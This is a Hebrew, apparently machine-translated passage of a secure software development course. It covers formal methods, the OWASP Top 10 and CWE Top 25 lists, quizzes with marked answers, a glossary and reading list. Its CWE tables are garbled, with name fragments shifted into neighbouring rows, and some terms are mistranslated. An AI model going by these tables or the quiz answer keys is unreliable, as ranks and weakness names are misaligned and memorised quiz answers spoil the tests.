* המערכת האקולוגית של Why3/Frama-C משלבת חבילת כלים להוכחת נכונות תוכניות.

* לוגיקה טמפורלית של פעולות+ (TLA+) היא שפת אפיון פורמלית למטרות כלליות שימושית במיוחד לתיאור מערכות בו-זמניות ומבוזרות, ובעלת מגוון כלים תומכים.

#### שיטות פורמליות והעתיד

כיום נעשה שימוש בשיטות פורמליות רק בנסיבות מיוחדות, אך הן עשויות להפוך לבולטות יותר בעתיד. המטרה שלנו הייתה פשוט לגרום לך להיות מודע לכך, למקרה שתחליט שאולי כדאי להמשיך הלאה בעתיד. אינך יכול לשקול להשתמש בגישה אם מעולם לא שמעת עליה.

#### חידון 4.4: שיטות פורמליות

\>\>בחר את המשפטים הנכונים:<<

[!x] הביטוי "∀ X foo" נכון אם foo ** נכון לא משנה מה הערך של X.

[ ] שיטות פורמליות מבטלות הנחות. {{ נבחר: ממש לא. כל שיטה פורמלית צריכה להתחיל עם כמה הנחות. }}

[x] פותר שביעות רצון (SAT) לוקח חבורה של משתנים בוליאניים וביטויים בוליאניים, ומנסה למצוא קבוצה של ערכי משתנים בוליאניים שבהם כל הביטויים הבוליאניים נכונים.

[x] בודק מודלים לוקח מודל ומנסה להראות באופן ממצה שהוא נכון בכל המקרים.



## רשימות פגיעות מובילות

### OWASP טופ 10

ציינו קודם לכן כי ישנן שתי רשימות בשימוש נרחב של פגיעויות "מובילות", OWASP Top 10 (תוך התמקדות בסיכוני אבטחה של יישומי אינטרנט) ו- CWE Top 25. הם מזהים את מה שהם תופסים כפריטים "המובילים" מבחינת היותם נפוצים במיוחד ומסוכנים במיוחד.

ההיקפים השונים שלהם גורמים להבדלים רבים. לדוגמה, CWE Top 25 מפרט הצפות מאגר, בעוד ש- OWASP Top 10 לא, מכיוון שגלישת מאגר היא בעיה רצינית נפוצה בתחומים מסוימים (כגון מערכות משובצות) אך הן אינן נפוצות ביישומי אינטרנט.

הנה  רשימת [*הקטגוריות המובילות של OWASP 10*](https://owasp.org/Top10/) (מהדורת 2021):

1. בקרת גישה שבורה
2. כשלים קריפטוגרפיים
3. זריקה
4. חוסר ביטחון תכנון המערכת
5. תצורה שגויה של אבטחה
6. רכיבים פגיעים ומיושנים
7. כשלים בזיהוי ובאימות
8. כשלים בתקינות תוכנה ונתונים
9. כשלי רישום וניטור אבטחה
10. זיוף בקשות בצד השרת (SSRF)


בקורס זה כיסינו את כל 10 המובילים של OWASP, הן במהדורות  2017 [ והן ](https://owasp.org/www-project-top-ten/2017/Top_10) במהדורת 2021[](https://owasp.org/Top10/), וכללנו הפניות צולבות כשעשינו זאת.

#### חידון 4.5: OWASP טופ 10

\>\>בחר את המשפטים הנכונים:<<

[!x] הזרקה היא סיכון המופיע בטופ 10 של OWASP לשנת 2021.

[x] תצורה שגויה של אבטחה היא סיכון המופיע ב- OWASP Top 10 לשנת 2021.

[ ] הצפת המאגר נמצאת בטופ 10 של OWASP לשנת 2021. {{ נבחר: לא, וזה מובן אם פספסת את זה. גלישת מאגרים נפוצה מאוד במערכות משובצות, מכיוון שהן מיושמות באופן נרחב ב- C וב- C++ המספקות הגנה מועטה מפני הצפת מאגר. רוב יישומי האינטרנט נכתבים בשפות תכנות אחרות המגנות מפני הצפת מאגרים, ולכן יש להם נדירות יחסית ביישומי אינטרנט. }}

### טופ 25 של CWE

הנה מהדורת 2021  של [25 שגיאות התוכנה המסוכנות ביותר של CWE](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html). רשימה זו נוצרה באמצעות נתונים מהעולם האמיתי, במיוחד, הפגיעויות הידועות לציבור עם פגיעויות וחשיפות נפוצות (CVE) כפי שפורסמו במסד הנתונים הלאומי לפגיעויות (NVD) של המכון הלאומי לתקנים וטכנולוגיה (NIST), כולל ציוני החומרה כפי שחושבו באמצעות ציוני מערכת ניקוד הפגיעויות הנפוצות (CVSS). רשימה זו משלבת סוגים רבים ושונים של תוכנות; אם זה טוב או לא תלוי בנקודת המבט שלך.

אף מערכת אינה מושלמת. סיבוך הוא שה-CWEs שזוהו כאן נמצאים ברמות היררכיות שונות. לדוגמה,  #17 CWE-119 ([הגבלה לא נכונה של פעולות בגבולות מאגר זיכרון](https://cwe.mitre.org/data/definitions/119.html)) היא קבוצת-על הן * של #3 CWE-125 (קריאה מחוץ לתחום) והן של #1 *CWE-787[](https://cwe.mitre.org/data/definitions/125.html)* * ([](https://cwe.mitre.org/data/definitions/787.html)כתיבה מחוץ לתחום**), אך כולן מפורטות כאן. ובכל זאת, זה מספק גישה הגנתית וחוזרת על עצמה לזיהוי מה שחשוב.

#### טופ 25

<table>
  <tr>
   <td>דרגה</td>
    <td>מזהה</td>
   <td> שם</td>
  </tr>
  <tr>
   <td>[1]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787</a></td>
    כתיבה<td>
   </td>
  </tr>
  <tr>
   <td>[2]</td> מחוץ לתחום<td><a href="https://cwe.mitre.org/data/definitions/79.html"> CWE-79</a></td>
   <td> נטרול לא תקין של קלט במהלך יצירת דף אינטרנט ('סקריפטים חוצי אתרים')</td>
  </tr>
  <tr>
   <td>[3]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/125.html">CWE-125</a></td>
    קריאה<td>
   </td>
  </tr>
  <tr>
   <td>[4]</td> מחוץ לתחום<td><a href="https://cwe.mitre.org/data/definitions/20.html"> CWE-20</a></td>
    אימות<td>
   </td>
  </tr>
  <tr>
   <td>[5]</td> קלט לא תקין<td><a href="https://cwe.mitre.org/data/definitions/78.html"> CWE-78</a></td>
   <td> נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודת מערכת הפעלה ('הזרקת פקודות מערכת הפעלה')</td>
  </tr>
  <tr>
   <td>[6]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a></td>
   <td> נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודת SQL ('הזרקת SQL')</td>
  </tr>
  <tr>
   <td>[7]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/416.html">CWE-416</a></td>
    <td>השתמש לאחר חינם</td>
  </tr>
  <tr>
   <td>[8]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a></td>
   <td> הגבלה לא נאותה של שם נתיב לספרייה מוגבלת ('חציית נתיב')</td>
  </tr>
  <tr>
   <td>[9]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352</a></td>
   <td> זיוף בקשות חוצה אתרים (CSRF)</td>
  </tr>
  <tr>
   <td>[10]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434</a></td>
   <td> העלאה בלתי מוגבלת של קובץ עם סוג</td>
  </tr>
  <tr>
   <td>[11]</td>
    מסוכן <td><a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306</a></td>
   <td> אימות חסר עבור פונקציה</td>
  </tr>
  <tr>
   <td>[12]</td>
    קריטית <td><a href="https://cwe.mitre.org/data/definitions/190.html">CWE-190</a></td>
   <td> גלישה או מעטפת</td>
  </tr>
  <tr>
   <td>[13]</td>
    של מספר שלם <td><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502</a></td>
   <td> דה-סדרתיזציה של נתונים</td>
  </tr>
  <tr>
   <td>[14]</td>
    לא מהימנים <td><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287</a></td>
   <td> אימות</td>
  </tr>
  <tr>
   <td>[15]</td>
    לא תקין <td><a href="https://cwe.mitre.org/data/definitions/476.html">CWE-476</a></td>
   <td> הפניית</td>
  </tr>
  <tr>
   <td>[16]</td>
    מצביע NULL <td><a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798</a></td>
   <td> שימוש באישורים המקודדים</td>
  </tr>
  <tr>
   <td>[17]</td>
    באופן קשיח <td><a href="https://cwe.mitre.org/data/definitions/119.html">CWE-119</a></td>
   <td> הגבלה לא נכונה של פעולות בגבולות מאגר זיכרון</td>
  </tr>
  <tr>
   <td>[18]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a></td>
   <td> הרשאה</td>
  </tr>
  <tr>
   <td>[19]</td>
    חסרה <td><a href="https://cwe.mitre.org/data/definitions/276.html">CWE-276</a></td>
    הרשאות<td>
   </td>
  </tr>
  <tr>
   <td>[20]
   </td> ברירת מחדל שגויות<td><a href="https://cwe.mitre.org/data/definitions/200.html"> CWE-200</a></td>
   <td> חשיפת מידע רגיש לגורם</td>
  </tr>
  <tr>
   <td>[21]</td>
    בלתי מורשה <td><a href="https://cwe.mitre.org/data/definitions/522.html">CWE-522</a></td>
    אישורים<td>
   </td>
  </tr>
  <tr>
   <td>[22]</td> לא מוגנים מספיק<td><a href="https://cwe.mitre.org/data/definitions/732.html"> CWE-732</a></td>
   <td> הקצאת הרשאה שגויה עבור משאב</td>
  </tr>
  <tr>
   <td>[23]</td>
    קריטי <td><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611</a></td>
   <td> הגבלה לא נכונה של הפניה</td>
  </tr>
  <tr>
   <td>[24]</td>
    לישות חיצונית של XML <td><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></td>
   <td> זיוף בקשות בצד השרת (SSRF)</td>
  </tr>
  <tr>
   <td>[25]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77</a></td>
   <td> נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודה ('הזרקת פקודה')</td>
  </tr>
</table>


#### על הצוק

המפתחים של CWE Top 25 הרגישו שיש מספר חולשות שהיו חשובות, אך לא הצליחו להיות בטופ 25 שלהם מכיוון שהם לא היו נפוצים או נטו להיות פחות חמורים. הם קוראים לחולשות האלה *על הסף*.

מפתחים שמשלימים הפחתה ומסתכנים בקבלת החלטות ב-CWE Top 25 לשנת 2021 עשויים לרצות לחפש את החולשות האחרות האלה שעשויות להופיע בתוכנה שלהם. מסיבות אלה, משתמשים ב-CWE Top 25 לשנת 2021 צריכים לשקול ברצינות לכלול את החולשות הנוספות הללו בניתוחים שלהם:

<table>
  <tr>
   <td>דרגה</td>
    <td>מזהה</td>
   <td> שם</td>
  </tr>
  <tr>
   <td>[26]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/295.html">CWE-295</a></td>
    אימות<td>
   </td>
  </tr>
  <tr>
   <td>[27]</td> אישורים לא תקין<td><a href="https://cwe.mitre.org/data/definitions/400.html"> CWE-400</a></td>
   <td> צריכת משאבים בלתי מבוקרת</td>
  </tr>
  <tr>
   <td>[28]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94</a></td>
   <td> שליטה לא נכונה ביצירת קוד ('הזרקת קוד')</td>
  </tr>
  <tr>
   <td>[29]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/269.html">CWE-269</a></td>
    ניהול<td>
   </td>
  </tr>
  <tr>
   <td>[30]</td> הרשאות לא תקין<td><a href="https://cwe.mitre.org/data/definitions/917.html"> CWE-917</a></td>
   <td> נטרול לא תקין של אלמנטים מיוחדים המשמשים במשפט שפת ביטוי ('הזרקת שפת ביטוי')</td>
  </tr>
  <tr>
   <td>[31]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/59.html">CWE-59</a></td>
   <td> רזולוציית קישור לא נכונה לפני גישה לקובץ ('קישור עוקב')</td>
  </tr>
  <tr>
   <td>[32]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/401.html">CWE-401</a></td>
   <td> שחרור חסר של זיכרון לאחר חיים</td>
  </tr>
  <tr>
   <td>[33]</td>
    יעילים <td><a href="https://cwe.mitre.org/data/definitions/362.html">CWE-362</a></td>
   <td> ביצוע בו-זמני באמצעות משאב משותף עם סינכרון לא תקין ('מצב גזע')</td>
  </tr>
  <tr>
   <td>[34]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/427.html">CWE-427</a></td>
    רכיב<td>
   </td>
  </tr>
  <tr>
   <td>[35]</td> נתיב חיפוש לא מבוקר<td><a href="https://cwe.mitre.org/data/definitions/319.html"> CWE-319</a></td>
   <td> העברת טקסט ברור של מידע</td>
  </tr>
  <tr>
   <td>[36]</td>
    רגיש <td><a href="https://cwe.mitre.org/data/definitions/843.html">CWE-843</a></td>
   <td> גישה למשאב באמצעות סוג לא תואם ('בלבול סוג')</td>
  </tr>
  <tr>
   <td>[37]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
    <td>ניתוב מחדש של כתובת URL לאתר לא מהימן ('פתח ניתוב מחדש')</td>
  </tr>
  <tr>
   <td>[38]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863</a></td>
   <td> הרשאה</td>
  </tr>
  <tr>
   <td>[39]</td>
    שגויה <td><a href="https://cwe.mitre.org/data/definitions/532.html">CWE-532</a></td>
   <td> הכללת מידע רגיש בקבצי</td>
  </tr>
  <tr>
   <td>[40]</td>
    יומן רישום <td><a href="https://cwe.mitre.org/data/definitions/770.html">CWE-770</a></td>
   <td> הקצאת משאבים ללא מגבלות או ויסות</td>
  </tr>
</table>

תשמחו לדעת שסדרת הקורסים הזו דנה, לפחות בקצרה, בכל אחת מהנקודות התורפה הללו, אפילו אלה "על הסף",
הן עבור  מהדורות [2019](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html) והן  עבור [2021](https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html) של  רשימת 25 המובילים של CWE.


#### חידון 4.6: CWE טופ 25

\>\>בחר את המשפטים הנכונים:<<

[!x]  רשימת 25 שגיאות התוכנה המסוכנות ביותר של CWE לשנת 2021 נוצרה באמצעות נתונים מהעולם האמיתי על פגיעויות בשילוב עם ציוני החומרה שלהן

[x]  רשימת 25 שגיאות התוכנה המסוכנות ביותר של CWE לשנת 2021 היא שילוב של כל סוגי התוכנות.

[ ] 25 שגיאות התוכנה המסוכנות ביותר של CWE המפורטות ברשימת 25 שגיאות התוכנה המסוכנות ביותר של CWE לשנת 2021 אינן חופפות זו לזו. {{ נבחר: לא, יש CWEs שחופפים. לדוגמה, CWE-119 ("הגבלה לא נכונה של פעולות בגבולות מאגר זיכרון") היא קבוצת-על הן של CWE-125 ("קריאה מחוץ לתחום") והן של CWE-787 ("כתיבה מחוץ לתחום"). }}

## הערות לסיכום

### מסקנות

מטרת קורס זה היא לעזור לך לפתח תוכנה מאובטחת. אנו מקווים שאתה מרגיש הרבה יותר מוכן להתמודד עם התוקפים.

במהלך פיתוח התוכנה שלך:

* שקול את דרישות האבטחה שלה. וודאו שאתם יודעים מה הוא אמור לעשות... ולא ** לעשות.

* תכנון המערכת לביטחון. שקול כל הזמן עקרונות עיצוב, כמו פריבילגיה מינימלית ואי-עקיפה.

* הטמע לצורך אבטחה. בפרט, נגד סוגים נפוצים של טעויות. פשוט להתמודד עם סוגים נפוצים של פגיעויות זה לא מספיק כדי ליצור מערכת מאובטחת, אבל זה צעד גדול קדימה. הכרת הסוגים הנפוצים של טעויות יישום תעזור לך גם להיות מודע לסוגים אחרים של פגיעויות.

* לאמת. בפרט, השתמש בכלים כדי לזהות בעיות *לפני* המשלוח. היכן שניתן, הפעל כלים בהקדם האפשרי וודא שהם נמצאים בצנרת האינטגרציה הרציפה (CI) שלך.

* שדה ולטפל באופן מיידי בדוחות פגיעות.

בחיים האמיתיים ביטחון הוא תהליך - מסע - ולא נקודת קצה פשוטה. אנו מקווים שהקורס הזה גרם לך להיות הרבה יותר מוכן לצאת למסע הזה. אנו מאחלים לך את הטוב ביותר כשאתה מפתח תוכנה שתעזור להגן על המוניטין, הרכוש ואפילו החיים של אנשים.

# חלק ג': בחינת גמר

* לא כלול כחלק מהגרסה החינמית של הקורס.

# חלק ד': חומרים תומכים שאינם חלק מהקורס

# מילון מונחים

תוקף: אדם שתוקף מערכות מחשב.

הקשחת מערכת: שינוי מערכת כך שפגמים נוטים פחות להפוך לפגיעויות אבטחה.

האקר: "אדם שמתענג על הבנה אינטימית של הפעולות הפנימיות של מערכת, מחשבים ורשתות מחשבים בפרט". ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983))

# לקריאה נוספת

(לא חלק מהקורס כשלעצמו)

רבים אחרים דנים כיצד לפתח תוכנה מאובטחת. קורס זה רק מכסה את היסודות (כפי שאנו רואים אותם). הנה כמה משאבים:

* "תכנון המערכת ותכנות תוכנה מאובטחים: חומרי כיתה" מאת דייוויד א. וילר  - [https://dwheeler.com/secure-class/](https://dwheeler.com/secure-class/) - חומרי הרצאה לכיתת בוגרים באוניברסיטת ג'ורג ' מייסון (GMU). זוהי כיתת בוגרים, ולכן היא נכנסת לפרטים נוספים.

* "תכנות מאובטח HOWTO" - ספר מאת דייוויד א. וילר - [https://dwheeler.com/secure-programs/](https://dwheeler.com/secure-programs/)

* "שיטות בסיסיות לפיתוח תוכנה מאובטחת, מהדורה שלישית" מתוך SAFECode. SAFECode פרסמה חומרים שימושיים אחרים, כגון "ניהול סיכוני אבטחה הטמונים בשימוש ברכיבי צד שלישי" ו"פרקטיקות לפיתוח מאובטח של יישומי ענן" - [https://safecode.org/publications/](https://safecode.org/publications/)

* תכנות מאובטח עם ניתוח סטטי מאת בריאן צ'ס וג'ייקוב ווסט

* מדריך רשמי (ISC)2 ל- CSSLP CBK ((ISC)2 עיתונות), פול, מנו

* צמצום הסיכון לפגיעויות תוכנה על-ידי אימוץ מסגרת פיתוח תוכנה מאובטחת (SSDF), NIST [https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf](https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf)

* בניית מודל אבטחה בשלות (BSIMM) <[https://www.bsimm.com/](https://www.bsimm.com/)>

* מסגרת BSA לתוכנה מאובטחת [https://www.bsa.org/files/reports/bsa_software_security_framework_web_final.pdf](https://www.bsa.org/files/reports/bsa_software_security_framework_web_final.pdf)

* שיטות קידוד מאובטחות של OWASP - מדריך עזר מהיר <https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/migrated_content>

* [שיטות עבודה מומלצות לשרשרת אספקת תוכנה](https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf) מקרן המחשוב המקומית בענן (CNCF)

# מיפויים ישנים

## OWASP טופ 10 ו-CWE טופ 25

### OWASP טופ 10 (מהדורת 2017)

להלן 10 סיכוני האבטחה המובילים של יישומי אינטרנט של* OWASP * (מהדורת 2017); אנא קרא רשימה זו כדי לוודא שאתה מבין כל אחד מהם:

1. *"הזרקה. פגמים בהזרקה, כגון SQL, NoSQL, OS והזרקת LDAP, מתרחשים כאשר נתונים לא מהימנים נשלחים למתורגמן כחלק מפקודה או שאילתה. הנתונים העוינים של התוקף יכולים להטעות את המתורגמן לבצע פקודות לא מכוונות או לגשת לנתונים ללא הרשאה מתאימה.*

2. *אימות שבור. פונקציות יישום הקשורות לאימות וניהול הפעלות מיושמות לעתים קרובות באופן שגוי, ומאפשרות לתוקפים לסכן סיסמאות, מפתחות או אסימוני הפעלה, או לנצל פגמים אחרים ביישום כדי להניח זהויות של משתמשים אחרים באופן זמני או קבוע.*

3. *חשיפת נתונים רגישים. יישומי אינטרנט וממשקי API רבים אינם מגנים כראוי על נתונים רגישים, כגון נתונים פיננסיים, שירותי בריאות ו-PII. תוקפים עשויים לגנוב או לשנות נתונים מוגנים חלשים כאלה כדי לבצע הונאה בכרטיסי אשראי, גניבת זהות או פשעים אחרים. * *נתונים רגישים עלולים להיחשף ללא הגנה נוספת, כגון הצפנה במנוחה או במעבר, ודורשים אמצעי זהירות מיוחדים בעת החלפתם עם הדפדפן.*

4. *XML ישויות חיצוניות (XXE). מעבדי XML ישנים רבים או שתצורתם נקבעה בצורה גרועה מעריכים הפניות לישויות חיצוניות בתוך מסמכי XML. ניתן להשתמש בישויות חיצוניות כדי לחשוף קבצים פנימיים באמצעות המטפל ב- URI של הקובץ, שיתופי קבצים פנימיים, סריקת יציאות פנימיות, ביצוע קוד מרחוק והתקפות מניעת שירות.*

5. *בקרת גישה שבורה. הגבלות על מה שמשתמשים מאומתים מורשים לעשות אינן נאכפות לעתים קרובות כראוי. תוקפים יכולים לנצל פגמים אלה כדי לגשת לפונקציונליות ו/או לנתונים לא מורשים, כגון גישה לחשבונות של משתמשים אחרים, הצגת קבצים רגישים, שינוי נתונים של משתמשים אחרים, שינוי זכויות גישה וכו'.*

6. *תצורה שגויה של אבטחה. תצורה שגויה של אבטחה היא הבעיה הנפוצה ביותר. בדרך כלל זוהי תוצאה של תצורות ברירת מחדל לא מאובטחות, תצורות לא שלמות או אד הוק, אחסון פתוח בענן, כותרות HTTP שגויות והודעות שגיאה מילוליות המכילות מידע רגיש. לא רק שיש להגדיר באופן מאובטח את כל מערכות ההפעלה, המסגרות, הספריות והיישומים, אלא שיש לתקן/לשדרג אותם בזמן.*

7. *סקריפטים חוצי אתרים XSS. פגמים ב- XSS מתרחשים בכל פעם שיישום כולל נתונים לא מהימנים בדף אינטרנט חדש ללא אימות או בריחה מתאימים, או מעדכן דף אינטרנט קיים בנתונים שסופקו על-ידי המשתמש באמצעות API של דפדפן שיכול ליצור HTML או JavaScript. XSS מאפשר לתוקפים להפעיל סקריפטים בדפדפן של הקורבן שיכולים לחטוף הפעלות משתמש, להשחית אתרי אינטרנט או להפנות את המשתמש לאתרים זדוניים.*

8. *דה-סריאליזציה לא בטוחה. deserialization לא מאובטח מוביל לעתים קרובות לביצוע קוד מרחוק. גם אם פגמים ב-deserialization אינם גורמים לביצוע קוד מרחוק, ניתן להשתמש בהם לביצוע התקפות, כולל התקפות הפעלה חוזרת, התקפות הזרקה והתקפות הסלמה של הרשאות.*

9. *שימוש ברכיבים עם פגיעויות ידועות. רכיבים, כגון ספריות, מסגרות ומודולי תוכנה אחרים, פועלים עם אותן הרשאות כמו היישום. אם רכיב פגיע מנוצל לרעה, התקפה כזו עלולה להקל על אובדן נתונים חמור או השתלטות על שרתים. יישומים וממשקי API המשתמשים ברכיבים עם פגיעויות ידועות עלולים לערער את הגנות היישומים ולאפשר התקפות והשפעות שונות.*

10. *רישום וניטור לא מספיקים. רישום וניטור לא מספיקים, יחד עם שילוב חסר או לא יעיל עם תגובה לתקריות, מאפשרים לתוקפים להמשיך לתקוף מערכות, לשמור על התמדה, להסתובב למערכות נוספות ולחבל בנתונים, לחלץ או להשמיד אותם. רוב מחקרי ההפרה מראים שהזמן לאיתור הפרה הוא מעל 200 יום, בדרך כלל מזוהה על ידי גורמים חיצוניים ולא על ידי תהליכים פנימיים או ניטור".*

### 25 המובילים של CWE (מהדורת 2019)

הנה מהדורת 2019  של [25 שגיאות התוכנה המסוכנות ביותר של CWE](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html). רשימה זו נוצרה באמצעות נתונים מהעולם האמיתי, במיוחד, הפגיעויות הידועות לציבור עם פגיעויות וחשיפות נפוצות (CVE) כפי שפורסמו במסד הנתונים הלאומי לפגיעויות (NVD) של המכון הלאומי לתקנים וטכנולוגיה (NIST), כולל ציוני החומרה כפי שחושבו באמצעות ציוני מערכת ניקוד הפגיעויות הנפוצות (CVSS). רשימה זו משלבת סוגים רבים ושונים של תוכנות; אם זה טוב או לא תלוי בנקודת המבט שלך.

אף מערכת אינה מושלמת. סיבוך הוא שה-CWEs שזוהו כאן נמצאים ברמות היררכיות שונות. לדוגמה, #1  CWE-119 ([הגבלה לא נכונה של פעולות בתוך גבולות מאגר זיכרון](https://cwe.mitre.org/data/definitions/119.html)) היא קבוצת-על הן של #5 * CWE-125 (מחוץ לתחום לקרוא*) ו # [ ](https://cwe.mitre.org/data/definitions/125.html)12 *CWE-787* ([מחוץ לתחום](https://cwe.mitre.org/data/definitions/787.html)**), אך כולם רשומים כאן. ובכל זאת, זה מספק גישה הגנתית וחוזרת על עצמה לזיהוי מה שחשוב.

#### 25 המובילים (2019)

<table>
  <tr>
    <td>דרגה</td>
     <td>מזהה</td>
    <td> שם</td>
  </tr>
  <tr>
    <td>[1]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/119.html">CWE-119</a></td>
    <td> הגבלה לא נכונה של פעולות בגבולות מאגר זיכרון</td>
  </tr>
  <tr>
    <td>[2]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79</a></td>
    <td> נטרול לא תקין של קלט במהלך יצירת דף אינטרנט ('סקריפטים חוצי אתרים')</td>
  </tr>
  <tr>
    <td>[3]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20</a></td>
     אימות<td>
    </td>
  </tr>
  <tr>
    <td>[4]</td> קלט לא תקין<td><a href="https://cwe.mitre.org/data/definitions/200.html"> CWE-200</a></td>
    <td> חשיפת</td>
  </tr>
  <tr>
    <td>[5]</td>
     מידע <td><a href="https://cwe.mitre.org/data/definitions/125.html">CWE-125</a></td>
     קריאה<td>
    </td>
  </tr>
  <tr>
    <td>[6]</td> מחוץ לתחום<td><a href="https://cwe.mitre.org/data/definitions/89.html"> CWE-89</a></td>
    <td> נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודת SQL ('הזרקת SQL')</td>
  </tr>
  <tr>
    <td>[7]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/416.html">CWE-416</a></td>
     <td>השתמש לאחר חינם</td>
  </tr>
  <tr>
    <td>[8]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/190.html">CWE-190</a></td>
    <td> גלישה או מעטפת</td>
  </tr>
  <tr>
    <td>[9]</td>
     של מספר שלם <td><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352</a></td>
    <td> זיוף בקשות חוצה אתרים (CSRF)</td>
  </tr>
  <tr>
    <td>[10]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a></td>
    <td> הגבלה לא נאותה של שם נתיב לספרייה מוגבלת ('חציית נתיב')</td>
  </tr>
  <tr>
    <td>[11]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78</a></td>
    <td> נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודת מערכת הפעלה ('הזרקת פקודות מערכת הפעלה')</td>
  </tr>
  <tr>
    <td>[12]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787</a></td>
     כתיבה<td>
    </td>
  </tr>
  <tr>
    <td>[13]</td> מחוץ לתחום<td><a href="https://cwe.mitre.org/data/definitions/287.html"> CWE-287</a></td>
    <td> אימות</td>
  </tr>
  <tr>
    <td>[14]</td>
     לא תקין <td><a href="https://cwe.mitre.org/data/definitions/476.html">CWE-476</a></td>
    <td> הפניית</td>
  </tr>
  <tr>
    <td>[15]</td>
     מצביע NULL <td><a href="https://cwe.mitre.org/data/definitions/732.html">CWE-732</a></td>
    <td> הקצאת הרשאה שגויה עבור משאב</td>
  </tr>
  <tr>
    <td>[16]</td>
     קריטי <td><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434</a></td>
    <td> העלאה בלתי מוגבלת של קובץ עם סוג</td>
  </tr>
  <tr>
    <td>[17]</td>
     מסוכן <td><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611</a></td>
    <td> הגבלה לא נכונה של הפניה</td>
  </tr>
  <tr>
    <td>[18]</td>
     לישות חיצונית של XML <td><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94</a></td>
    <td> שליטה לא נכונה ביצירת קוד ('הזרקת קוד')</td>
  </tr>
  <tr>
    <td>[19]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798</a></td>
    <td> שימוש באישורים המקודדים</td>
  </tr>
  <tr>
    <td>[20]</td>
     באופן קשיח <td><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></td>
    <td> צריכת משאבים בלתי מבוקרת</td>
  </tr>
  <tr>
    <td>[21]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/772.html">CWE-772</a></td>
    <td> שחרור חסר של משאב לאחר חיים יעילים (!)</td>
  </tr>
  <tr>
    <td>[22]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/426.html">CWE-426</a></td>
    <td> נתיב חיפוש לא מהימן (!)</td>
  </tr>
  <tr>
    <td>[23]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502</a></td>
    <td> דה-סדרתיזציה של נתונים</td>
  </tr>
  <tr>
    <td>[24]</td>
     לא מהימנים <td><a href="https://cwe.mitre.org/data/definitions/269.html">CWE-269</a></td>
     ניהול<td>
    </td>
  </tr>
  <tr>
    <td>[25]</td> הרשאות לא תקין<td><a href="https://cwe.mitre.org/data/definitions/295.html"> CWE-295</a></td>
    <td> אימות אישורים לא תקין</td>
  </tr>
</table>

אלה המסומנים ב-(!) נמצאים במהדורת 2019 אך לא במהדורת 2021.


#### על הסוס (2019)

המפתחים של CWE Top 25 הרגישו שיש מספר חולשות שהיו חשובות, אך לא הצליחו להיות בטופ 25 שלהם מכיוון שהם לא היו נפוצים או נטו להיות פחות חמורים. הם קוראים לחולשות האלה *על הסף*.

מפתחים שמשלימים הפחתה ומסתכנים בקבלת החלטות ב-CWE Top 25 לשנת 2019 עשויים לרצות לחפש את החולשות האחרות האלה שעשויות להופיע בתוכנה שלהם. מסיבות אלה, משתמשים ב-CWE Top 25 לשנת 2019 צריכים לשקול ברצינות לכלול את החולשות הנוספות הללו בניתוחים שלהם:

<table>
  <tr>
    <td>דרגה</td>
     <td>מזהה</td>
    <td> שם</td>
  </tr>
  <tr>
    <td>[26]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/835.html">CWE-835</a></td>
     <td>לולאה עם מצב יציאה שלא ניתן להגיע אליו ('לולאה אינסופית') (!)</td>
  </tr>
  <tr>
    <td>[27]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/522.html">CWE-522</a></td>
     אישורים<td>
    </td>
  </tr>
  <tr>
